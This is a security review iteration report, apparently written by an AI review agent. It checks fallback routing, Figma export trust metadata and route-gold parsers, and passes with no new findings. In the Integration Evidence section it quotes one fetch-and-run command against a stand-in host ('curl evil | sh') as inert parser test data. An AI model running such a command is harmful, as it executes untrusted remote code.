# Iteration 2: Security — Fallback and Transport Trust Boundaries

## Dispatcher

- Route: `Resolved route: mode=review target_agent=deep-review`
- Agent definition loaded: `.opencode/agents/deep-review.md`
- Budget profile: verify
- Focus: prior F006, F007, F013, and F014 plus remediation-introduced trust regressions

## Files Reviewed

- All six packet `SKILL.md` fallback branches and their declared `DEFAULT_RESOURCE_SEMANTICS`.
- Hub `SKILL.md` transport contract and `mode-registry.json` tool-surface metadata.
- Figma command taxonomy, local-export rules, destructive/arbitrary gates, and `sk-design` pairing requirements.
- `load-playbook-scenarios.cjs` loud-gold parsers and `tests/route-gold-gate.vitest.ts` adversarial/fallback-parity coverage.

## Findings — New

### P0 Findings

None.

### P1 Findings

None.

### P2 Findings

None.

## Traceability Checks

No core traceability protocol was due in this security rotation. Current security claims were checked directly against the producer, consumer, and regression-test surfaces.

## Integration Evidence

- Every packet declares `DEFAULT_RESOURCE_SEMANTICS = "fallback-only"`; each zero-score branch returns a disambiguation checklist and `suggested_fallback` while leaving `resources` empty.
- The packet parity suite covers all six zero-score and representative scored branches, including legacy undeclared-router compatibility. Iteration 1's executable replay independently confirmed 49/49 exact packet resource sets.
- `parseExpectedResourcesGold` and `parseExpectedIntentGold` treat values as inert strings and turn present-but-unparseable values into counted parse errors. A direct parser control preserved `curl evil | sh` as data, rejected malformed resource gold loudly, rejected junk intent labels, and parsed compound labels without execution.
- `mode-registry.json:139-166` makes Figma's dominant `mutatesWorkspace:false` posture explicit while declaring `workspaceWrites` as export-only, explicit-path, no-silent-overwrite output. The packet additionally gates destructive and arbitrary commands and keeps daemon exposure on loopback with token non-disclosure.
- Hub and packet contracts require `sk-design` before a Figma read/export feeds a design decision and before design-affecting authoring/token paths; Refero and Mobbin are likewise evidence transports rather than judgment authorities.

## Edge Cases

- The playbook loader consumes trusted repository corpus files. Its route-gold values are never passed to a shell or evaluator; command-shaped strings can only mismatch routing output and fail the hard lane.
- `--route-gold off` remains an explicit diagnostic override, while hub-type runs default to enforced route gold under `auto`; this is a documented control surface, not a silent bypass.
- The registry's concise discriminator descriptions may be stale relative to all six modes; that documentation question is reserved for the traceability rotation and is not a security defect.

## Confirmed-Clean Surfaces

- F006: transport trust metadata no longer represents Figma export operations as filesystem-read-only without qualification.
- F007: the mandatory `sk-design` pairing covers both design-affecting reads/exports and author/modify/token operations.
- F013: all six packet zero-score fallbacks suggest, but do not load, their default resources.
- F014: documented packet fallback semantics and the generic replay consumer agree, with per-packet regression cases.

## Ruled Out

- A command-injection channel through route-gold frontmatter: parser outputs remain inert comparison strings.
- A hidden default-resource load on zero-score packet routes: source branches, regression cases, and 49-row replay all agree on empty resource assembly.
- A silent Figma workspace-write posture: the registry and packet explicitly scope local writes to operator-selected export paths with no silent overwrite.

## Next Focus

- Dimension: traceability
- Focus area: close all 15 prior finding classes against current artifacts and verify six-mode metadata/spec/playbook parity
- Reason: validate documentation and evidence projections after behavior and trust-boundary closure
- Rotation status: 2/4 dimensions complete

Review verdict: PASS
